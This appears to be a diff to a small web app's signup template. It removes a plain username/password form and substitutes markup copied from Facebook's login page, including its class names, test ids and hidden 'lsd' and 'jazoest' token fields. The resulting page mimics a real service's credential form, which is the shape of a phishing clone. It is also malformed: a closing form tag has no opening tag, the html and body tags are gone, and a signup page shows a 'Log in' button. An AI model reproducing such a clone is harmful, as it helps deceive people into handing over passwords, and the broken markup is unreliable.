@@ -1,24 +1,50 @@
 <!DOCTYPE html>
-<html>
 <head>
-    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/styles.css"> 
+    <link rel="stylesheet" href="css/signup.css"> 
     <title><%= title %></title>
 </head>
-<body>
-    <% if (isuser) { %>
-        <h3>User <%=username%> already exists.</h3>
-    <% } %>
-
-            <form action="/signup" method="POST">
-              <label for="username">Username:</label>
-              <input type="text" id="username" name="username" autocomplete="off" required><br>
-          
-              <label for="password">Password:</label>
-              <input type="password" id="password" name="password" autocomplete="off" required><br>
-              <button type="submit">signup</button>
-            </form>
-
-</body>
-</html>
 
 
+<div class="_8esn">
+    <div class="_8iep _8icy _9ahz _9ah-">
+      <div class="_6luv _52jv">
+        
+          <input type="hidden" name="jazoest" value="21056" autocomplete="off">
+          <input type="hidden" name="lsd" value="AVpsJzavo9c" autocomplete="off">
+          <div>
+            <div class="_6lux">
+              <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Email address" autofocus="1" aria-label="Email address">
+            </div>
+            <div class="_6lux">
+              <div class="_6luy _55r1 _1kbt" id="passContainer">
+                <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal_pass" placeholder="Password" aria-label="Password">
+                <div class="_9ls7 hidden_elem" id="u_0_3_sN">
+                  <a href="#" role="button">
+                    <div class="_9lsa">
+                      <div class="_9lsb" id="u_0_4_Ye"></div>
+                    </div>
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+         
+          <div class="_6ltg">
+            <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_MQ">Log in</button>
+          </div>
+          <div class="_6ltj">
+            <a href>allready have an account</a>
+          </div>
+          <div class="_8icz"></div>
+          <div class="_6ltg">
+           
+          </div>
+        </form>
+      </div>
+      <div id="reg_pages_msg" class="_58mk">
+        <a href="/pages/create/?ref_type=registration_form" class="_8esh"></a>
+      </div>
+    </div>
+  </div>
+  
